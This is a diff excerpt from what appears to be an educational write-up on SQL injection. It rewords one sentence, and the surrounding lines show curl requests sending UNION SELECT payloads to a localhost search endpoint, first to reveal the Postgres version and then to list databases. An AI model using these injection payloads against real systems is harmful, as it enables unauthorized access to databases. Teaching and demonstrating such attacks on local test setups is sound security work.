@@ -112,8 +112,8 @@ $ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%201,%20VERSION
 ]
 ```
 
-Discovering that the database appears to be Postgres, the malicious actor can then write a query to list databases... 
-(`http://localhost/search?prefix=Intro' UNION SELECT 1, datname, NULL, NULL FROM pg_database--`):
+Now that the attacker knows that the database appears to be Postgres, they can then write a query to list databases: 
+`http://localhost/search?prefix=Intro' UNION SELECT 1, datname, NULL, NULL FROM pg_database--`.
 
 ```sh
 $ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%201,%20datname,%20NULL,%20NULL%20FROM%20pg_database-- | jq
